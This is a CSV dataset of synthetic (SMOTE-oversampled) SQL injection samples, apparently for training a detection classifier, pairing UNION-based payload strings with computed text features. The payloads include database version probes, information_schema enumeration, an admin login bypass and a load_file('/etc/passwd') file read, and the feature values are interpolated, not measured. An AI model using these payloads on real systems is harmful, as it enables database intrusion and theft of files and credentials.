id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000122,attack,union,"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",nearest_attack_euclidean,R000014,0.02655112119344195,55.87770140497111,20.993885070248556,4.02369963020547,14.0,27.902161123976892,4.0,9.975540280994224,0.2508492957988117,0.4989808450414259,0.07167122737108904,0.17849863178867328,0.006114929751444453,0.9938850702485558,3.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,4.975540280994223,3.0,0.006114929751444231,0.993885070248556,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000123,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000019,5.2450688353829085,80.48105527326541,24.864467459019423,4.109297282034676,27.378510846993528,28.85956612025895,11.0,13.242978306012947,0.367490255479775,0.3123772567274963,0.14691446818069703,0.17321801961203165,1.3785108469935263,0.0,1.864467459019421,0.7570216939870527,0.0,0.0,0.37851084699352633,1.3785108469935263,0.0,0.37851084699352644,7.107445765032368,2.6214891530064737,1.0,0.0,0.6214891530064737,0.0,0.0,0.0,1.0,0.37851084699352633,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.37851084699352633,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3785108469935263
SMOTE_000124,attack,union,union select * from users where login   =   char ...,nearest_attack_euclidean,R000004,2.38044723932938,51.76348288480412,20.236517115195884,3.903555632573326,34.946068460783536,0.0,11.81741442402058,5.0,0.6754287865299411,0.0,0.22797144515332451,0.09659976831673434,0.0,0.0,0.0,0.0,1.0,0.7634828848041159,0.0,0.23651711519588403,0.0,0.23651711519588425,0.23651711519588403,1.763482884804116,0.0,0.0,0.0,0.0,0.0,0.7634828848041159,0.2365171151958843,0.0,0.0,0.0,0.0,1.0,1.0,0.763482884804116,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.23651711519588417,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7634828848041157,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.763482884804116
SMOTE_000125,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,0.04360755725787642,94.01182918961848,28.035487568855444,4.1860049187300765,29.094633516947848,35.90536648305215,15.023658379236963,13.988170810381519,0.3094683655200629,0.381934893458078,0.15980363379664023,0.14879310722521882,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.976341620763038,5.0118291896184815,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.011829189618481034,2.0,1.0,1.0,0.011829189618481006,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0118291896184815
SMOTE_000126,attack,union," union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",nearest_attack_euclidean,R000003,3.0936324547016993,64.15334242049907,23.669756762475544,4.137257488689023,27.776747745841487,12.930090166340557,11.0,12.446504508317028,0.45822491254683856,0.15881469497476028,0.18093053662396028,0.20202985585444083,1.7767477458414862,0.0,0.6697567624755416,1.5534954916829722,0.0,0.0,0.7767477458414861,1.7767477458414862,0.0,0.7767477458414862,5.116261270792569,2.223252254158514,1.0,0.0,0.2232522541585139,0.0,0.0,0.0,1.0,0.7767477458414861,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7767477458414861,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.776747745841486
SMOTE_000127,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,0.8563949952324177,79.06550199483507,31.128821001106772,4.349713809021772,47.194322995941846,2.2903929996310772,18.01637549870877,11.564410500553386,0.5945232539706014,0.028433459026881658,0.22758765417358723,0.14945563282892985,0.0,0.0,2.0,0.0,1.8548035001844618,1.1451964998155382,0.0,0.0,0.0,0.0,1.0,7.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.14519649981553828,2.0,1.0,1.1451964998155384,1.1451964998155382,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.290392999631077
SMOTE_000128,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000001,0.09835165896461698,102.98214710028515,26.035705799429696,4.0744854986848145,65.92858840114062,4.0,23.982147100285154,9.071411598859392,0.6401887394535183,0.0388417486768379,0.2328754636324507,0.08809404823719313,0.05355869914454381,0.03570579942969587,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,1.0,6.982147100285152,0.017852899714848047,0.017852899714847936,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.9821471002851521,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000129,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000013,1.1557220717754286,54.25405328903224,20.325405328903223,3.9297610895114823,14.0,26.603242631225797,4.0,9.65081065780645,0.25986604112939526,0.48816075064472575,0.07424744032268435,0.17772576790319472,0.6745946710967755,0.3254053289032245,3.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,4.650810657806449,3.0,0.6745946710967754,0.3254053289032246,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000130,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000013,1.6190846087450432,49.87002932350141,20.0,3.8652470053071832,14.0,23.096023458801124,4.0,8.774005864700282,0.30716312688172576,0.4314042477419291,0.08776089339477877,0.17367173198156638,0.5376656892166197,0.4623343107833802,3.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,3.7740058647002823,3.0,0.5376656892166197,0.4623343107833804,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000131,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000028,0.5640231055549951,67.17810587944716,24.23562117588943,4.145280344441555,27.0,20.942484703557724,11.0,8.235621175889431,0.4041078599064712,0.30908378500250905,0.16463653551745122,0.12217181957356851,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.235621175889431,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000132,attack,union," )   union select * from information_schema.tables,",nearest_attack_euclidean,R000008,3.757012043381245,55.014469189272305,21.80289383785446,4.075846083610333,33.584083891800475,6.423150702835674,9.20434075678169,5.80289383785446,0.623670346926865,0.10529755250550285,0.1662827467314972,0.10474935383613498,0.4014469189272296,0.0,1.204340756781689,0.0,0.5985530810727703,0.0,0.0,1.0,0.0,0.5985530810727704,1.4014469189272298,1.8028938378544592,0.4014469189272297,0.0,0.40144691892722967,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.5985530810727702,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5985530810727703,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.1971061621455403
SMOTE_000133,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,0.43325222883968534,98.71785219491596,27.786308699152663,3.6900219445485845,25.0,39.572617398305326,21.35892609745799,12.786308699152663,0.2536424653553524,0.40097132409476066,0.21592043880200537,0.12946577174788165,0.8931543495763311,0.10684565042366889,3.0,0.0,0.0,1.0,0.0,1.893154349576331,0.0,0.0,5.893154349576331,4.0,0.893154349576331,0.106845650423669,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000134,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000012,1.6420117758560262,108.06606757588116,26.924524323215845,3.687372921020413,25.0,46.45285406070494,22.0,14.613213515176234,0.23246507048721485,0.4280558872204563,0.2045692620287491,0.13490978026357983,0.46226216160792233,0.5377378383920779,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,7.613213515176234,4.0,0.46226216160792233,0.5377378383920778,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000135,attack,union," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000007,0.4606717675426911,102.08362163845509,27.832756723089823,4.167681738481798,62.334486553820355,4.0,23.08362163845509,12.665513446179645,0.6105970956506244,0.03918384860519508,0.2261189900473969,0.12410006569678352,2.7491350846347338,1.8327567230898225,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,1.0,6.083621638455089,0.9163783615449113,0.9163783615449113,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.08362163845508874,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000136,attack,union,"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",nearest_attack_euclidean,R000014,0.5465764462898731,53.48238385225294,20.874119192612646,4.033739687350682,14.0,25.985907081802345,4.0,9.496476770450586,0.26748344547046576,0.4790198654354411,0.0764238415629902,0.17707284753110294,0.1258808073873534,0.8741191926126467,3.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,4.496476770450586,3.0,0.12588080738735352,0.8741191926126466,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000137,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,3.0070539563593988,88.09258310575319,30.060358058406933,4.289892867918716,52.728388737168785,2.9698209707965333,19.909462912389596,12.484910485398267,0.59693535929863,0.03275181785597825,0.2260961837426687,0.1442166391027231,1.4547314561947988,0.9698209707965322,2.0,0.0,1.5150895146017338,1.4849104853982662,0.0,0.0,0.0,0.0,1.0,6.515089514601733,0.4849104853982662,0.4849104853982662,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.4849104853982662,1.4849104853982662,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.969820970796532
SMOTE_000138,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,0.7423370919854827,73.52125518946943,28.361673585959235,4.310404324504887,28.680836792979616,20.63832641404077,14.361673585959233,9.840418396489808,0.390039117279383,0.28108318440228935,0.1950789907725432,0.13379870754578446,2.6808367929796164,0.0,3.0,0.0,0.0,0.8404183964898083,0.0,1.0,0.0,0.0,1.478744810530575,4.680836792979616,1.0,0.0,1.0,0.0,0.0,0.8404183964898083,1.0,0.0,0.0,0.0,0.0,1.8404183964898082,1.0,0.8404183964898084,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.680836792979617
SMOTE_000139,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,0.2674864997298513,73.82749376931963,28.769991692426167,4.32161652204419,28.884995846213084,20.230008307573833,14.769991692426167,9.942497923106542,0.39122428117805463,0.27416649017397626,0.19995564878183136,0.13465357986613777,2.8849958462130836,0.0,3.0,0.0,0.0,0.9424979231065418,0.0,1.0,0.0,0.0,1.172506230680375,4.884995846213084,1.0,0.0,1.0,0.0,0.0,0.9424979231065416,1.0,0.0,0.0,0.0,0.0,1.9424979231065418,1.0,0.9424979231065418,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8849958462130836
SMOTE_000140,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,0.1960059503980626,109.0912901738095,28.0,4.141794056502958,36.54564508690475,39.77282254345238,16.886411271726185,15.886411271726187,0.3347817430491848,0.36473490066028835,0.15483107417167497,0.1456522821188519,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,5.943205635863094,5.943205635863094,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9432056358630935,2.0,1.0,1.0,0.9432056358630936,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.943205635863094
SMOTE_000141,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,0.89301706286123,69.6914504637765,23.7449814683237,4.041270182796309,27.0,22.95316037102121,11.0,8.738290092755303,0.40254966486988286,0.31097670341732747,0.1640017153173597,0.12247191639542997,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.738290092755302,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000142,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000015,1.2751869773241333,44.379017022233946,20.68308384144334,3.9651898584998952,17.646681656460572,12.488223577182248,8.84154192072167,5.4025698678694525,0.4029332800366132,0.2641124546173674,0.21275074114609166,0.12020352419992775,0.2805139735738904,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.1220558942955616,3.0,0.2805139735738904,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000143,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,0.8286017250889507,100.82931151302454,28.0,3.738615331296602,25.82931151302454,40.829311513024535,20.548704852207056,13.621983634768405,0.2559806118727731,0.40478448949821855,0.20429092614751593,0.13494397248149245,1.4146557565122695,0.0,3.0,0.0,0.0,1.0,0.0,1.7926721217438655,0.0,0.0,6.207327878256135,4.207327878256135,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.2073278782561347,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2073278782561347
SMOTE_000144,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,0.0006498703276089286,61.001383847188244,23.00073262498201,4.027617336901165,27.000651222206233,16.000732624982014,11.000081402775779,6.999918597224221,0.4426234469694194,0.2622998210527303,0.18032571316735013,0.11475101881050016,1.0002442083273375,0.0,2.9997557916726625,0.0,0.0,8.140277577894928e-05,0.0,0.9999185972242209,0.0,0.0,1.9999185972242208,2.999837194448442,1.0,0.0,0.9999185972242208,0.0,0.0,8.140277577917132e-05,0.9999185972242208,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,8.140277577910193e-05,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000814027757787
SMOTE_000145,attack,union,"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",nearest_attack_euclidean,R000024,0.25344233821589596,112.89772600655704,26.0,3.723805011787096,25.0,50.75420800388565,21.53282800145712,15.610690001214266,0.2225846689561338,0.4488193842001862,0.19056573597068321,0.13803021087299686,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.9221380002428534,0.0,0.0,8.688552000971413,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000146,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000030,0.22330239100967578,76.14519698178192,28.0,4.266944470748628,29.0,20.964376405711086,15.0,11.180820576070829,0.3819559273089822,0.2736772043677579,0.19756341067705976,0.14680345764620015,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.2410941014277719,5.939726474643057,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9397264746430571,2.0,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000147,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000010,1.5898058102440422,78.0,32.0,4.5366377574018895,35.0,25.0,12.0,6.0,0.44871794871794873,0.32051282051282054,0.15384615384615385,0.07692307692307693,2.9773021674921156,1.0226978325078846,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.7443255418730289,0.2556744581269712,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000148,attack,union,union select * from users where login   =   char ...,nearest_attack_euclidean,R000004,3.7314967620367647,44.51701925620253,19.584278847566807,3.8511422453033806,25.685576951336145,3.325769219465542,10.921394237834036,4.584278847566807,0.5532077753159466,0.09781674174898652,0.24388645364068834,0.10508902929437858,0.0,0.0,1.2471634572995784,0.0,0.5842788475668071,0.5842788475668071,0.0,0.41572115243319285,0.0,0.0,0.0,2.4157211524331927,0.0,0.0,0.4157211524331928,0.0,0.0,0.5842788475668071,0.41572115243319285,0.0,0.0,0.0,0.0,1.0,1.0,0.5842788475668071,0.584278847566807,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5842788475668071,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7528365427004213
SMOTE_000149,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,1.8998747287386482,94.37759334808142,27.062932224680235,3.7798945067115994,25.0,38.12586444936047,19.18879667404071,12.062932224680235,0.26597274617022326,0.4042593989787262,0.20211052428934997,0.1276573305617006,0.5314661123401181,0.4685338876598821,3.0,0.0,0.0,1.0,0.0,1.5314661123401179,0.0,0.0,5.531466112340118,4.0,0.5314661123401181,0.468533887659882,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000150,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000022,0.4752253623790517,100.60183490490682,28.0,4.07968248736947,29.0,41.28146792392546,15.0,15.320366980981365,0.28892663540893027,0.40945089282654945,0.14944481141841218,0.1521776603461081,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,6.320366980981365,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000151,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000022,0.10856575795440572,104.19037550108575,28.0,4.0295020053397455,29.253834001447686,43.87308299927616,15.063458500361921,16.0,0.2806711404387301,0.42119091869553726,0.14455804646165676,0.15357989440407588,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,6.96827074981904,5.031729250180961,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.031729250180960344,2.0,1.0,1.0,0.0317292501809604,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.031729250180961
SMOTE_000152,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000019,0.3997397482113614,94.81726260373887,25.913458239297967,4.084747406420487,27.028847253567342,42.84610985730622,11.0,13.94230549286531,0.2878225844775597,0.44720965752592556,0.117047369575544,0.14792038842097077,1.0288472535673445,0.0,2.913458239297966,0.05769450713468883,0.0,0.0,0.028847253567344414,1.0288472535673443,0.0,0.02884725356734464,8.855763732163277,2.9711527464326553,1.0,0.0,0.9711527464326555,0.0,0.0,0.0,1.0,0.028847253567344414,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.028847253567344414,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0288472535673447
